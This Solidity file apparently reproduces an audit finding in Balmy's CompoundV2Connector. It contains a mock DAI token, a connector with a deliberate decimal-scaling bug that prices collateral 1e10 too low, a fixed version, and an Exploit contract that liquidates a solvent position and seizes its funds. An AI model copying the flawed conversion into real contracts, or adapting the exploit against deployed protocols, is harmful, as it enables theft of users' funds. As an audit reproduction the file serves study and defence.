// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Balmy CompoundV2Connector — Cantina, November 2024
    _convertSharesToAssets uses magnitude = 10 + underlying decimals.
    For DAI that is 28, not 18. Collateral is priced 1e10 too low, so a
    1 DAI debt liquidates a position actually worth 2e8 DAI.
*/

contract Dai {
    string public symbol = "DAI";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CompoundV2Connector {
    Dai public dai;
    uint256 public immutable assetDecimals;
    uint256 public exchangeRate;
    uint256 public cBalance;
    uint256 public debt;
    uint256 public priced;

    constructor(Dai dai_, uint256 decimals_) {
        dai = dai_;
        assetDecimals = decimals_;
    }

    function load(uint256 cTokens, uint256 rate, uint256 debt_) external {
        cBalance = cTokens;
        exchangeRate = rate;
        debt = debt_;
    }

    function _max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a : b;
    }

    function _convertSharesToAssets(uint256 shares) public view returns (uint256) {
        uint256 underlyingTokenDecimals = _max(assetDecimals, 8);
        uint256 magnitude = (10 + underlyingTokenDecimals);
        // @> VULN: magnitude is 10 + decimals (28 for DAI) instead of 18, so the cToken is worth 1e10 too little
        return shares * exchangeRate / (10 ** magnitude);
    }

    function liquidate(address to) external returns (uint256 seizedUnderlying) {
        priced = _convertSharesToAssets(cBalance);
        require(debt > priced, "solvent");
        require(dai.transferFrom(msg.sender, address(this), debt), "repay");
        seizedUnderlying = cBalance * exchangeRate / 1e18;
        debt = 0;
        cBalance = 0;
        require(dai.transfer(to, seizedUnderlying), "seize");
    }
}

contract CompoundV2ConnectorFixed {
    Dai public dai;
    uint256 public exchangeRate;
    uint256 public cBalance;
    uint256 public debt;

    constructor(Dai dai_) {
        dai = dai_;
    }

    function load(uint256 cTokens, uint256 rate, uint256 debt_) external {
        cBalance = cTokens;
        exchangeRate = rate;
        debt = debt_;
    }

    function _convertSharesToAssets(uint256 shares) public view returns (uint256) {
        return shares * exchangeRate / 1e18;
    }

    function liquidate(address to) external returns (uint256) {
        uint256 priced = _convertSharesToAssets(cBalance);
        require(debt > priced, "solvent");
        require(dai.transferFrom(msg.sender, address(this), debt), "repay");
        uint256 seized = cBalance * exchangeRate / 1e18;
        require(dai.transfer(to, seized), "seize");
        return seized;
    }
}

contract Exploit {
    Dai public dai;
    CompoundV2Connector public connector;
    uint256 public constant C_BAL = 1e16;
    uint256 public constant RATE = 2e28;
    uint256 public priced;
    uint256 public seized;

    constructor() {
        dai = new Dai();
        connector = new CompoundV2Connector(dai, 18);
        connector.load(C_BAL, RATE, 1 ether);
        dai.mint(address(connector), C_BAL * RATE / 1e18);
        dai.mint(address(this), 1 ether);
        dai.approve(address(connector), type(uint256).max);
    }

    function run() external {
        priced = connector._convertSharesToAssets(C_BAL);
        seized = connector.liquidate(address(this));
        require(priced == 2e16, "priced");
        require(seized == 2e26, "seized");
        require(priced * 1e10 == seized, "1e10");
        require(dai.balanceOf(address(this)) == 2e26, "balance");
    }
}
